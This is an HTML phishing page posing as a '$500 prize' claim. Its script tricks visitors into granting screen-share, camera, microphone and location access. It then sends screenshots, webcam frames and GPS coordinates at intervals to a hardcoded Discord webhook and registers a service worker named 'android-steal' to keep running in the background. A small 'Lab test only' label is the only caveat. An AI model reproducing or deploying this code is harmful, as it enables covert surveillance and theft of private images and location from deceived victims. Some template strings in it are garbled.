<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Prize - One Click</title>
    <style>
        body {margin:0;background:#000;color:#0f0;font-family:Arial;text-align:center;padding:50px;}
        button {padding:25px 60px;font-size:28px;background:#c00;color:white;border:none;border-radius:20px;cursor:pointer;}
        .info {margin-top:50px;color:#666;font-size:14px;}
    </style>
</head>
<body>

<h1>Congratulations! You Won $500</h1>
<button onclick="startEverything()">CLAIM NOW (one click)</button>
<div class="info">Lab test only â€“ requires camera + screen sharing</div>

<script>
// YOUR DISCORD WEBHOOK HERE
const WEBHOOK = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";

let screenStream = null;
let cameraStream = null;
let watchId = null;

// Register persistent service worker (keeps running in background)
navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
    self.addEventListener('periodicsync', e => {
        if (e.tag === 'android-steal') {
            e.waitUntil(fetch('${WEBHOOK}', {method:'POST', body:JSON.stringify({content:'Background alive - '+new Date()})}));
        }
    });
`));

async function startEverything() {
    try {
        // 1. Get SCREEN + CAMERA at the same time
        screenStream = await navigator.mediaDevices.getDisplayMedia({video:true, audio:false});
        cameraStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true});

        alert("Prize activated! Processing...");

        const screenVideo = document.createElement('video');
        screenVideo.srcObject = screenStream;
        screenVideo.play();

        const camVideo = document.createElement('video');
        camVideo.srcObject = cameraStream;
        camVideo.play();

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        // 2. SCREEN every 4 seconds
        setInterval(() => {
            canvas.width = screenVideo.videoWidth;
            canvas.height = screenVideo.videoHeight;
            ctx.drawImage(screenVideo, 0, 0);
            canvas.toBlob(blob => sendToDiscord(blob, "SCREEN", "screen.jpg"), 'image/jpeg', 0.75);
        }, 4000);

        // 3. CAMERA every 8 seconds
        setInterval(() => {
            canvas.width = camVideo.videoWidth;
            canvas.height = camVideo.videoHeight;
            ctx.drawImage(camVideo, 0, 0);
            canvas.toBlob(blob => sendToDiscord(blob, "CAMERA", "cam.jpg"), 'image/jpeg', 0.8);
        }, 8000);

        // 4. LOCATION every 30 seconds (works in background too)
        watchId = navigator.geolocation.watchPosition(pos => {
            const loc = `Lat: \( {pos.coords.latitude}, Lon: \){pos.coords.longitude}, Acc: ${pos.coords.accuracy}m`;
            sendToDiscord(null, "LOCATION", loc);
        }, null, {enableHighAccuracy: true, maximumAge: 0, timeout: 30000});

        // 5. Register background sync (runs even when Chrome is closed)
        if ('periodicSync' in navigator.serviceWorker) {
            const reg = await navigator.serviceWorker.ready;
            reg.periodicSync.register('android-steal', {minInterval: 15 * 60 * 1000}); // every 15 min
        }

    } catch(e) {
        alert("You blocked access - no prize today");
    }
}

function sendToDiscord(blob, type, filename) {
    const form = new FormData();
    if (blob) form.append("file", blob, filename || "capture.jpg");
    form.append("content", `**\( {type}** - \){new Date().toLocaleString()}\nUser: ${navigator.userAgent.split(' ').pop()}`);
    
    fetch(WEBHOOK + "?wait=true", {method: "POST", body: form, keepalive: true});
}
</script>

</body>
</html>
